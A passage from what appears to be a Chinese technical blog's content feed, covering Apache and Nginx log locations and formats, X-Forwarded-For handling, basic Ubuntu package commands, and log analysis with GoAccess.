        <content type="html"><![CDATA[<h2 id="apache日志位置"><a href="#apache日志位置" class="headerlink" title="apache日志位置"></a>apache日志位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## CentOS，Fedora，RedHat：</span><br><span class="line">/var/log/httpd/access.log</span><br><span class="line">## Ubuntu，Debian，Mint：</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/httpd-access.log</span><br></pre></td></tr></table></figure><h2 id="访问日志文件"><a href="#访问日志文件" class="headerlink" title="访问日志文件"></a>访问日志文件</h2><p>始终将访问日志写入单个文件不是可行的方法。 随着时间的流逝，在标准的Web服务器中，将有许多访问日志文件，它们以结构化的方式命名。 我们可以使用<code>ls</code>命令列出访问日志文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lh /var/log/apache2/access.*</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210827174205366.png" alt="image-20210827174205366"></p><blockquote><p>将旧的访问日志文件名加1到文件名的末尾，最后2个最近的访问日志文件后将压缩较旧的访问日志文件，以节省空间。 默认情况下，使用gzip或gz压缩，并且压缩文件的名称类似于<code>access.log.2.gz</code> ，以表示使用gzip压缩了该文件。</p></blockquote><h3 id="zless读取压缩的访问日志文件"><a href="#zless读取压缩的访问日志文件" class="headerlink" title="zless读取压缩的访问日志文件"></a>zless读取压缩的访问日志文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zless /var/log/apache2/access.log.2.gz</span><br></pre></td></tr></table></figure><h3 id="zgrep搜索，过滤和Grep压缩访问日志"><a href="#zgrep搜索，过滤和Grep压缩访问日志" class="headerlink" title="zgrep搜索，过滤和Grep压缩访问日志"></a>zgrep搜索，过滤和Grep压缩访问日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zgrep Mozilla /var/log/apache2/access.log.2.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 搜索和过滤所有压缩文件</span></span><br><span class="line">zgrep Nmap /var/log/apache2/access.log.*.gz</span><br></pre></td></tr></table></figure><h2 id="Apache访问日志"><a href="#Apache访问日志" class="headerlink" title="Apache访问日志"></a>Apache访问日志</h2><h3 id="格式分类"><a href="#格式分类" class="headerlink" title="格式分类"></a>格式分类</h3><p>apache中日志记录格式主要有两种，普通型（<strong>common</strong>）和复合型（<strong>combined</strong>），安装时默认使用普通型（common）类型日志记录访问信息。</p><h3 id="配置文件位置-amp-格式"><a href="#配置文件位置-amp-格式" class="headerlink" title="配置文件位置&amp;格式"></a>配置文件位置&amp;格式</h3><p>apache2服务器的配置文件位置<code>/etc/apache2/apache2.conf</code>CentOS或RedHat<code>/etc/httpd/httpd.conf</code></p><p><strong>LogFormat</strong>指令：定义格式并为格式指定一个名字，以后我们就可以直接引用这个名字。</p><p><strong>CustomLog</strong>指令：设置日志文件，并指明日志文件所用的格式（通常通过格式的名字）。</p><h3 id="默认日志格式"><a href="#默认日志格式" class="headerlink" title="默认日志格式"></a>默认日志格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.77.175 - - [18/Aug/2021:03:54:21 -0400] &quot;GET /icons/openlogo-75.png HTTP/1.1&quot; 200 6040 &quot;http://192.168.88.132:8088/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210830102841285.png" alt="image-20210830102841285"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br></pre></td></tr></table></figure><p><code>%h</code>         客户端的IP地址</p><p><code>%l</code>         客户端身份 (输出中的连字符<code>-</code>表示请求的信息不可用)</p><p><code>%u</code>         客户端的userid(如果用户已通过身份验证)</p><p><code>%t</code>         请求到达的日期时间</p><p><code>\&quot;%r\&quot;</code>Client 端的请求行以双引号引起来，包含客户端使用方法，请求资源，使用协议。<code>%m %U%q %H</code>”将记录方法，路径，查询字符串和协议，从而得到与<code>\&quot;%r\&quot;</code>完全相同的输出</p><p><code>%&gt;s</code> 服务器发送回客户端的响应码</p><p><code>%O</code> 发送的字节(包括 Headers)不能为零    <code>mod_logio</code>模块    <a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_logio.html">Apache 模块 mod_logio</a></p><p><code>\&quot;%&#123;Referer&#125;i\&quot;</code>  HTTP 请求 Headers，提供客户端报告已被引用的站点</p><p><code>\&quot;%&#123;User-agent&#125;i\&quot;</code>用户代理 HTTP 请求 Headers，这是客户端浏览器报告的有关其自身的标识信息</p><p><code>%b</code>返回给客户端的对象的大小，不包括响应头。若没有内容返回给客户端该值为<code>-</code>。要记录<code>0</code>无内容，请改用<code>%B</code></p><p><code>%v</code>用于记录正在处理请求的虚拟主机的名称。然后，可以使用诸如<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/programs-split-logfile.html">split-logfile</a>之类的程序对访问日志进行后处理，以便将其分为每个虚拟主机一个文件。</p><h2 id="Apache错误日志"><a href="#Apache错误日志" class="headerlink" title="Apache错误日志"></a>Apache错误日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Fri Aug 20 03:35:41.969417 2021] [mpm_prefork:notice] [pid 1835] AH00163: Apache/2.4.46 (Debian) configured -- resuming normal operations</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ErrorLogFormat &quot;[%t] [%l] [pid %P] %F: %E: [client %a] %M&quot;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Format String</th><th>Description</th></tr></thead><tbody><tr><td><code>%%</code></td><td>百分号</td></tr><tr><td><code>%a</code></td><td>Client 端 IP 地址和请求的端口</td></tr><tr><td><code>%&#123;c&#125;a</code></td><td>基础对等 IP 地址和连接端口(请参阅<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_remoteip.html">mod_remoteip</a>模块)</td></tr><tr><td><code>%A</code></td><td>本地 IP 地址和端口</td></tr><tr><td><code>%&#123;name&#125;e</code></td><td>请求环境变量<em>名称</em></td></tr><tr><td><code>%E</code></td><td>APR/OS 错误状态代码和字符串</td></tr><tr><td><code>%F</code></td><td>日志调用的源文件名和行号</td></tr><tr><td><code>%&#123;name&#125;i</code></td><td>请求 Headers<em>名称</em></td></tr><tr><td><code>%k</code></td><td>此连接上的保持活动请求数</td></tr><tr><td><code>%l</code></td><td>消息的日志级别</td></tr><tr><td><code>%L</code></td><td>请求的日志 ID</td></tr><tr><td><code>%&#123;c&#125;L</code></td><td>连接的日志 ID</td></tr><tr><td><code>%&#123;C&#125;L</code></td><td>连接的日志 ID(如果用于连接范围)，否则为空</td></tr><tr><td><code>%m</code></td><td>记录消息的模块的名称</td></tr><tr><td><code>%M</code></td><td>实际的日志消息</td></tr><tr><td><code>%&#123;name&#125;n</code></td><td>要求说明<em>名称</em></td></tr><tr><td><code>%P</code></td><td>当前进程的进程 ID</td></tr><tr><td><code>%T</code></td><td>当前线程的线程 ID</td></tr><tr><td><code>%&#123;g&#125;T</code></td><td>当前线程的系统唯一线程 ID(与<code>top</code>显示的 ID 相同；当前仅 Linux)</td></tr><tr><td><code>%t</code></td><td>当前时间</td></tr><tr><td><code>%&#123;u&#125;t</code></td><td>当前时间，包括微秒</td></tr><tr><td><code>%&#123;cu&#125;t</code></td><td>紧凑型 ISO 8601 格式的当前时间，包括微秒</td></tr><tr><td><code>%v</code></td><td>当前服务器的规范<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#servername">ServerName</a>。</td></tr><tr><td><code>%V</code></td><td>根据<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#usecanonicalname">UseCanonicalName</a>设置为请求提供服务的服务器的服务器名称。</td></tr><tr><td><code>\</code>(反斜杠空格)</td><td>非场定界空间</td></tr><tr><td><code>%</code>(空间百分比)</td><td>字段定界符(无输出)</td></tr></tbody></table><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errorlog">errorlog</a></p><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/logs.html">Apache中文文档_logs</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分析Nginx攻击日志</title>
      <link href="/p/9cf51d2.html"/>
      <url>/p/9cf51d2.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1990ba97be66b719c6eca6936bf5244bb6dfaf6b55526639eaaef9f9b84c6c12"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu的常用操作</title>
      <link href="/p/3a63419e.html"/>
      <url>/p/3a63419e.html</url>
      
        <content type="html"><![CDATA[<h2 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h2><h3 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h3><p>更新源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt udpate</span><br></pre></td></tr></table></figure><p>更新已经安装的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install firefox</span><br></pre></td></tr></table></figure><p>移除软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove firefox</span><br><span class="line"># 删除并清除配置文件</span><br><span class="line">sudo apt --purge remove firefox</span><br></pre></td></tr></table></figure><p>清理安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoclean</span><br><span class="line">#清理所有安装包</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure><p>搜索软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search firefox</span><br></pre></td></tr></table></figure><p>列出已安装的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure><p>卸载多余依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h3 id="snap"><a href="#snap" class="headerlink" title="snap"></a>snap</h3><p>snap安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install firefox</span><br></pre></td></tr></table></figure><p>列出安装的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap list</span><br></pre></td></tr></table></figure><p>搜索软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap find</span><br></pre></td></tr></table></figure><p>更新软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo snap refresh firefox</span><br><span class="line"># 更新全部</span><br><span class="line">sudo snap refresh all</span><br></pre></td></tr></table></figure><p>卸载软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap remove firefox</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx日志</title>
      <link href="/p/4d35cb45.html"/>
      <url>/p/4d35cb45.html</url>
      
        <content type="html"><![CDATA[<p>Nginx是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器；同时也是一个IMAP、POP3、SMTP代理服务器；Nginx可以作为一个HTTP服务器进行网站的发布处理，另外Nginx可以作为反向代理进行负载均衡的实现。</p><span id="more"></span><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p><strong>特点：</strong>客户端非常明确要访问的服务器地址，屏蔽或隐藏了真实客户端信息。</p><p><strong>流程：</strong>客户端 —&gt; 正向代理服务器–&gt; 远程网站、资源</p><p><strong>用途：</strong>1.访问无法访问资源；2.做缓存；3.对客户端访问授权，上网进行认证；4.代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><strong>特点：</strong>反向代理隐藏了服务器的信息</p><p><strong>作用：</strong>（1）保证内网的安全，通常将反向代理作为公网访问地址，Web服务器是内网；（2）负载均衡，通过反向代理服务器来优化网站的负载</p><h2 id="Nginx日志"><a href="#Nginx日志" class="headerlink" title="Nginx日志"></a>Nginx日志</h2><h3 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h3><p>默认在 <code>/usr/local/nginx/logs</code> 目录下</p><p><code>access.log</code> 访问日志</p><p><code>error.log</code> 错误日志</p><p><code>nginx.conf</code> 配置文件</p><h3 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h3><h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">log_format</span>  main  <span class="string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里是通达OA中的默认配置</p></blockquote><p><strong>$remote_addr：</strong>请求服务器的客户端IP</p><p><strong>$remote_user：</strong>客户端用户名称，此项是用来记录用户HTTP的身份验证信息。如果某些网站要求用户进行身份验证，那么这一项就是记录用户的身份信息；</p><p><strong>$time_local：</strong> 请求的时间与时区；</p><p><strong>$request：</strong> 用来记录”请求方法/访问路径请求参数/协议”；</p><p><strong>$status：</strong> 用来记录请求状态；</p><p><strong>$body_bytes_sent ：</strong>记录发送给客户端文件主体内容大小；</p><p><strong>$http_referer：</strong>用来记录从哪个页面链接访问过来的；</p><p><strong>$http_user_agent：</strong>记录客户浏览器的相关信息；</p><p><strong>$http_x_forwarded_for：</strong>用以记录客户端的ip地址；</p><h4 id="日志样例"><a href="#日志样例" class="headerlink" title="日志样例"></a>日志样例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [18/Aug/2021:16:09:30 +0800] &quot;GET /inc/new_sms.php?now=1629274170398 HTTP/1.1&quot; 200 33 &quot;http://localhost:88/general/index.php&quot; &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727)&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><h4 id="X-Forwarded-For和-REMOTE-ADDR的区别"><a href="#X-Forwarded-For和-REMOTE-ADDR的区别" class="headerlink" title="X-Forwarded-For和 REMOTE_ADDR的区别"></a><a href="http://blog.nsfocus.net/user-ip/"><strong>X-Forwarded-For和 REMOTE_ADDR的区别</strong></a></h4><p><strong>REMOTE_ADDR</strong>代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个<strong>值是不可伪造</strong>的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，<strong>REMOTE_ADDR</strong>会被设置为代理机器的IP值。<br>正如前面所说，有了代理就获取不了用户的真实IP，由此X-Forwarded-For应运而生，它是一个非正式协议，在请求转发到代理的时候代理会添加一个<strong>X-Forwarded-For头</strong>，将连接它的客户端IP（也就是你的上网机器IP）加到这个头信息里，这样末端的服务器就能获取真正上网的人的IP了。</p><p>🌰🌰🌰</p><p>假设用户的请求顺序如下：<br>网民电脑ip-&gt;代理服务器1–&gt;代理服务器2–&gt;目标服务器<br><strong>REMOTE_ADDR</strong> 就是: 代理服务器2的IP值<br>**X-Forwarded-For **就是：网民电脑IP，代理1的IP，代理2的IP<br>在这里只有REMOTE_ADDR是可信的，其他从客户端获取的数据都是不可信的，都是可伪造的。</p><p>🥚💦</p><p>服务器端开了nginx反向代理的时候，每次获取的都是反向代理的IP，需要nginx在配置反向代理的时候做一定设置并且修改代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header            Host $host;</span><br><span class="line">proxy_set_header            X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header            X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure><blockquote><p>反向代理nginx的配置中将REMOTE_ADDR赋给了X-Real-IP，从X-Real-IP中来获取用户的IP</p></blockquote><h4 id="nginx获取post数据"><a href="#nginx获取post数据" class="headerlink" title="nginx获取post数据"></a>nginx获取post数据</h4><p>$request_body是nginx的内置变量,可以记录post的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.79.132 - - [25/Aug/2021:14:06:38 +0800] &quot;POST /logincheck.php HTTP/1.1&quot; 200 1000 &quot;http://192.168.77.175:8668/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; &quot;-&quot; &quot;UNAME=admin&amp;PASSWORD=&amp;encode_type=1&quot;</span><br></pre></td></tr></table></figure><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="GoAccess"><a href="#GoAccess" class="headerlink" title="GoAccess"></a>GoAccess</h3><p><a href="https://github.com/allinurl/goaccess?utm_source=ld246.com">Github地址</a> <a href="https://goaccess.io/?utm_source=ld246.com">官网</a> </p><p><a href="https://www.goaccess.cc/?mod=man">中文站点</a></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install goaccess</span><br></pre></td></tr></table></figure><blockquote><p>安装好的版本是1.4的，够用了后续用centos搭建的时候，再补充编译安装吧。</p></blockquote><h4 id="使用定义好的日志格式在终端输出"><a href="#使用定义好的日志格式在终端输出" class="headerlink" title="使用定义好的日志格式在终端输出"></a>使用定义好的日志格式在终端输出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goaccess oa.access.log -c</span><br></pre></td></tr></table></figure><blockquote><p>预定义的选项包括：通用日志格式，联合日志格式，包含虚拟主机，W3C 格式以及亚马逊 CloudFront(分布式下载)。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163337623.png" alt="image-20210820163337623"></p><p><strong>空格选中，回车继续，q退出，选择通用日志格式（CLF）</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163450514.png" alt="image-20210820163450514"></p><p><strong>终端输出：</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163616304.png" alt="image-20210820163616304"></p><h5 id="终端热键"><a href="#终端热键" class="headerlink" title="终端热键:"></a>终端热键:</h5><p><strong>F1</strong> 或 <strong>h</strong>主帮助页面。</p><p><strong>F5</strong>重绘主窗口。</p><p><strong>q</strong>退出程序，当前窗口或者崩溃了的模块。</p><p><strong>o</strong> 或 <strong>ENTER</strong>扩展选中的模块或打开窗口。</p><p><strong>0-9</strong> 和 <strong>Shift + 0</strong>激活选中的模块。</p><p><strong>c</strong>设置或者改变配色方案。</p><p><strong>滚动功能：</strong><br><strong>j</strong>在已扩展模块中向下滚动。</p><p><strong>k</strong>在已扩展模块中向上滚动。</p><p><strong>^ f</strong>在当前模块中向<strong>下</strong>滚动一页。</p><p><strong>^ b</strong>在当前模块中向<strong>上</strong>滚动一页。</p><p><strong>TAB</strong>切换模块(向后)。#和官网手册上写的不一样</p><p><del><strong>SHIFT + TAB</strong>切换模块(向后)。</del>    #测试无效</p><p><strong>g</strong>移动到第一个选项或者屏幕顶部。</p><p><strong>G</strong>移动到第最后一个选项或者屏幕底部。    </p><p><strong>s</strong>给活跃模块的选项排序。<br><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820165332356.png" alt="image-20210820165332356"></p><p>**/**在所有模块中搜索(支持正则)。</p><p><strong>n</strong>找到下次发生事件的位置。</p><h4 id="自定义-日志-日期-格式"><a href="#自定义-日志-日期-格式" class="headerlink" title="自定义 日志/日期 格式"></a>自定义 日志/日期 格式</h4><p>GoAccess 可以解析虚拟的任意 Web 日志格式。</p><p>配置文件位于：<code>%sysconfdir%/goaccess.conf</code> 或者 <code>~/.goaccessrc</code></p><mark class="hl-label blue">注意:</mark>    `%sysconfdir%` 可能是 /etc/, /usr/etc/ 或者 /usr/local/etc/<p><strong>time-format</strong> 参数 time-format 后跟随一个空格符，指定日志的<strong>时间</strong>格式，包含普通字符与特殊格式说明符的任意组合。他们都由百分号 (%)开始。参考 <code>man strftime</code>。 <code>%T</code> 或者 <code>%H:%M:%S</code>.</p><mark class="hl-label blue">注意:</mark>   如果给定的时间戳以**微秒**计算，则必须在 *time-format* 中使用参数 `%f` 。<p><strong>date-format</strong> 参数 date-format 后跟随一个空格符，指定日志的<strong>日期</strong>格式，包含普通字符与特殊格式说明符的任意组合。他们都由百分号 (%)开始。参考 <code>man strftime</code>。</p><mark class="hl-label blue">注意:</mark>  如果给定的时间戳以微秒计算，则必须在 *time-format* 中使用参数 `%f` 。<p><strong>log-format</strong> 参数 log-format 后跟随一个空格符或者制表分隔符(<code>\t</code>)，用于指定日志字符串格式。</p><p>朋友发给我一个他自己写的配置🤡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">log_format  access_json_log escape=json &#x27;&#123;&quot;@timestamp&quot;:&quot;$time_local&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_host&quot;:&quot;$http_host&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;request&quot;:&quot;$request&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;status&quot;:&quot;$status&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;size&quot;:&quot;$body_bytes_sent&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_addr&quot;:&quot;$upstream_addr&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_status&quot;:&quot;$upstream_status&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_response_time&quot;:&quot;$upstream_response_time&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;request_time&quot;:&quot;$request_time&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_referer&quot;:&quot;$http_referer&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_x_forwarded_for&quot;:&quot;$http_x_forwarded_for&quot;&#125;&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>看起来是个狠人</p></blockquote><p>那就写个配置文件练习一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time-format %H:%M:%S</span><br><span class="line">date-format %d/%b/%Y</span><br><span class="line">log_format &#123;&quot;%^&quot;:&quot;%d:%t %^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%h&quot;,&quot;%^&quot;:&quot;%r&quot;,&quot;%^&quot;:&quot;%s&quot;,&quot;%^&quot;:&quot;%b&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%u&quot;,&quot;%^&quot;:&quot;%^&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我感觉我这种做法太笨蛋🤓🤓，其实最后一个XFF按照官网手册应该是<code>~h</code>的，但不知道为什么写上去就报错，后续再研究一下吧。</p></blockquote><h4 id="特殊格式说明符"><a href="#特殊格式说明符" class="headerlink" title="特殊格式说明符"></a>特殊格式说明符</h4><p><strong>%x</strong> 匹配 time-format 和 date-format 变量的日期和时间字段。用于使用时间戳来代替日期和时间两个独立变量的场景。</p><p><strong>%t</strong> 匹配 time-format 变量的时间字段。</p><p><strong>%d</strong> 匹配 date-format 变量的日期字段。</p><p><strong>%v</strong> 根据 canonical 名称设定的服务器名称(服务区或者虚拟主机)。</p><p><strong>%e</strong> 请求文档时由 HTTP 验证决定的用户 ID。</p><p><strong>%h</strong> 主机(客户端IP地址，IPv4 或者 IPv6)。</p><p><strong>%r</strong> 客户端请求的行数。这些请求使用分隔符(单引号，双引号)引用的部分可以被解析。否则，需要使用由特殊格式说明符(例如：**%m**, <strong>%U</strong>, <strong>%q</strong> 和 <strong>%H</strong>)组合格式去解析独立的字段。</p><ul><li><mark class="hl-label blue">注意：</mark>  既可以使用 **%r** 获取完整的请求，也可以使用 **%m**, **%U**, **%q** and **%H** 去组合你的请求，但是不能同时使用。</li></ul><p><strong>%m</strong> 请求的方法。</p><p><strong>%U</strong> 请求的 URL。</p><ul><li><mark class="hl-label blue">注意：</mark>  如果查询字符串在 **%U**中，则无需使用 **%q**。但是，如果 URL 路径中没有包含任何查询字符串，则你可以使用 **%q** 查询字符串将附加在请求后面。</li></ul><p><strong>%q</strong> 查询字符串。</p><p><strong>%H</strong> 请求协议。</p><p><strong>%s</strong> 服务器回传客户端的状态码。</p><p><strong>%b</strong> 回传客户端的对象的大小。</p><p><strong>%R</strong> HTTP 请求的 “Referer” 值。</p><p><strong>%u</strong> HTTP 请求的 “UserAgent” 值。</p><p><strong>%D</strong> 处理请求的时间消耗，使用微秒计算。</p><p><strong>%T</strong> 处理请求的时间消耗，使用带秒和毫秒计算。</p><p><strong>%L</strong> 处理请求的时间消耗，使用十进制数表示的毫秒计算。</p><p><strong>%^</strong> 忽略此字段。</p><p><strong>%~</strong> 继续解析日志字符串直到找到一个非空字符(!isspace)。</p><p><strong>~h</strong> 在 X-Forwarded-For (XFF) 字段中的主机(客户端 IP 地址，IPv4 或者 IPv6)。</p><p>针对 XFF， GoAccess 使用了一个特殊符号，即由一个波浪号+主机说明符构成，然后紧跟由大括号封装起来的 XFF 限定字段(例：**<code>~h&#123;,&quot;&#125;</code>**)。</p><blockquote><p>举例如下， <strong><code>~h&#123;,&quot; &#125;</code></strong> 用于解析 “11.25.11.53, 17.68.33.17” 字段由一对双引号，一个逗号和一个空格限定。</p></blockquote><h4 id="输出HTML页面"><a href="#输出HTML页面" class="headerlink" title="输出HTML页面"></a>输出HTML页面</h4><p><strong>静态：</strong></p><figure 